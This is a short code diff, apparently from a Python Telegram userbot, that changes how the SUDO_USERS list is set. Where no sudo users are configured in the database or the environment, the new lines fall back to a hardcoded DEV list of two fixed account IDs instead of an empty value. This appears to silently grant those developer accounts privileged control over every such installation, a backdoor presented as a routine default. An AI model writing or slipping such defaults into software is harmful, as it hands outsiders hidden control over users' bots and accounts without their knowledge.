@@ -6,8 +6,8 @@ from ..sql_helper.global_list import get_collection_list
 from ..sql_helper.sqldb import getdb
 DEV = [5057493677, 1593802955]
 
-SUDO_USERS = getdb("SUDO_USERS") or []
-SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "").split()} or ""
+SUDO_USERS = getdb("SUDO_USERS") or DEV
+SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "").split()} or DEV
 
 
 
